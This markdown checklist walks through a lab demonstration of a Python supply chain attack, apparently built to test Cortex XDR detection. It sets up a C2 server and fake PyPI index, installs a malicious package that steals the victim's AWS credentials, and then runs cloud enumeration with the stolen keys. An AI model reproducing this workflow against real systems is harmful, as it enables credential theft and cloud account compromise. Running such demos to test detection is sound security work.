# Quick Start Checklist - Supply Chain Attack Demo

## 📦 Pre-Lab Setup (Do this NOW on current machine)

```bash
cd /Users/mabutbul/python-pack
tar -czf python-pack-demo.tar.gz \
  README.md \
  EXECUTION_GUIDE.md \
  QUICK_START_CHECKLIST.md \
  1-attacker-infrastructure/ \
  2-malicious-package/ \
  3-victim-application/ \
  4-attacker-operations/ \
  5-aws-infrastructure/
```

**Transfer file:** `python-pack-demo.tar.gz` to lab machines

---

## 🎯 Lab Execution Checklist

### Machine 1: C2 Server (Fake WAN)

#### Terminal 1 - Start C2 Server
```bash
□ cd ~/python-pack/1-attacker-infrastructure
□ sudo ./start_infrastructure.sh
□ Note C2 IP: _________________
□ Keep this terminal open!
```

#### Terminal 2 - Build Package
```bash
□ cd ~/python-pack/2-malicious-package
□ ./build_and_upload.sh <C2_IP>
□ Verify package uploaded
```

#### Terminal 3 - Setup AWS (if needed)
```bash
□ cd ~/python-pack/5-aws-infrastructure
□ ./setup_aws.sh
□ Save demo_aws_credentials file
```

---

### Machine 2: Victim Endpoint (with Cortex XDR)

#### Setup
```bash
□ cd ~/python-pack
□ mkdir -p ~/.aws
□ cp 5-aws-infrastructure/demo_aws_credentials ~/.aws/credentials
□ cd 3-victim-application
□ ./setup_victim.sh <C2_IP>
```

#### Trigger Attack
```bash
□ Open Cortex XDR console for monitoring
□ cd ~/python-pack/3-victim-application
□ export PIP_CONFIG_FILE=$(pwd)/.pip/pip.conf
□ pip install -r requirements.txt
□ Check C2 server terminal for stolen credentials
```

#### Optional - Runtime Test
```bash
□ python3 app.py
```

---

### Back to Machine 1: C2 Server - Cloud Attack

```bash
□ cd ~/python-pack/4-attacker-operations
□ ./run_attack.sh
□ Watch enumeration results
□ Check Cortex XDR for cloud alerts
```

---

## ✅ Success Indicators

- [ ] C2 server shows "Credentials stolen"
- [ ] Cortex XDR alert: Package installation
- [ ] Cortex XDR alert: Credential file access
- [ ] Cortex XDR alert: C2 connection
- [ ] AWS enumeration completes
- [ ] Cortex XDR alert: Cloud enumeration

---

## 🔑 Key Information

**C2 Server IP:** _________________

**Ports:**
- 80 = PyPI server
- 443 = C2 listener

**Critical Files:**
- C2: `1-attacker-infrastructure/stolen_aws_credentials`
- Victim: `~/.aws/credentials`

---

## 🚨 Quick Troubleshooting

**No credentials stolen?**
→ Check firewall on C2 server (ports 443, 80)
→ Verify C2 IP is correct in build script

**pip can't find package?**
→ Visit http://<C2_IP>/simple/ in browser
→ Check PyPI server is running

**AWS enumeration fails?**
→ Check stolen_aws_credentials file exists
→ Verify IAM user was created correctly

---

## 🧹 Quick Cleanup

**Victim:**
```bash
pip uninstall aws-data-utils -y
rm -rf ~/python-pack
```

**C2 Server:**
```bash
# Ctrl+C to stop server
cd ~/python-pack/1-attacker-infrastructure
rm -f stolen_*
```

---

**Full details:** See EXECUTION_GUIDE.md
